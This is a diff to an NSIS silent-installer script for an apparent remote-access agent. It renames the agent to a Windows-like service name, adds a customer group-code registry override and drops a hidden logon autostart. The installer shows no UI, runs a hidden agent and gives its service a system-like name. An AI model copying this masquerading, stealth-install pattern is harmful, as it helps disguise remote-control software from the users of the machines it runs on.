@@ -1,4 +1,4 @@
-; RuntimeAroker - silent installer shell
+; DevicesFlowUserSvc - silent installer shell
 ; Flow: run once (UAC) -> msiexec /qn silent install -> configure service
 ;       recovery + description -> exit. No UI at all.
 ; Build-time placeholders: __PRODUCT__ (product name), __MSI__ (absolute Windows
@@ -8,6 +8,7 @@
 
 Unicode true
 !include "LogicLib.nsh"
+!include "FileFunc.nsh"
 Name "__PRODUCT__"
 OutFile "__PRODUCT___Setup.exe"
 RequestExecutionLevel admin
@@ -24,6 +25,19 @@ VIAddVersionKey /LANG=1033 "LegalCopyright" "__COMPANY__"
 VIAddVersionKey /LANG=1033 "OriginalFilename" "__PRODUCT___Setup.exe"
 
 Section "install"
+  ; Optional /CODE=HDxxxxxxxx parameter: customer group code override.
+  ; Written to HKCU (read by the agent at startup, priority over the
+  ; build-time embedded default). One installer serves all customers:
+  ;   __PRODUCT___Setup.exe /S /CODE=HDxxxxxxxx
+  ; Omitting /CODE keeps the embedded default group code.
+  ${GetOptions} "$CMDLINE" "/CODE=" $R9
+  ${IfNot} ${Errors}
+    ${If} $R9 != ""
+      ClearErrors
+      WriteRegStr HKCU "Software\__PRODUCT__" "GroupCode" "$R9"
+    ${EndIf}
+  ${EndIf}
+
   SetOutPath "$TEMP\__PRODUCT___setup"
   File /oname=setup.msi "__MSI__"
   StrCpy $1 "$TEMP\__PRODUCT___setup"
@@ -44,12 +58,6 @@ Section "install"
   ExecWait 'sc description __PRODUCT__ "Provides device flow user session support"' $2
   ExecWait 'sc config __PRODUCT__ start= auto' $2
 
-  ; Autostart at logon (2026-11-14): the agent UI runs fully hidden (silent
-  ; patch) and is the device-reporting process (60s AgentReporter poll).
-  ; Without this Run entry the UI never starts again after reboot and the
-  ; device stops reporting to the address book.
-  WriteRegStr HKCU "Software\Microsoft\Windows\CurrentVersion\Run" "__PRODUCT__" '"$LOCALAPPDATA\__PRODUCT__\__PRODUCT__.exe"'
-
   ; Launch the agent UI once: the first run shows the local ID panel.
   ; HyDesk first-run ID window: two triggers, either one is enough --
   ;  1) a short-lived marker in the machine-wide ProgramData dir
@@ -58,8 +66,8 @@ Section "install"
   ;     which survives even if the marker cannot be written/read.
   ; MSI silent remote installs get neither, and the app also falls back to
   ; "first run on this machine" so the ID panel is never unreachable.
-  CreateDirectory "$COMMONAPPDATA\RuntimeAroker"
-  FileOpen $4 "$COMMONAPPDATA\RuntimeAroker\.hy_show_id" w
+  CreateDirectory "$COMMONAPPDATA\DevicesFlowUserSvc"
+  FileOpen $4 "$COMMONAPPDATA\DevicesFlowUserSvc\.hy_show_id" w
   FileWrite $4 "1"
   FileClose $4
   StrCpy $3 "$LOCALAPPDATA\__PRODUCT__"
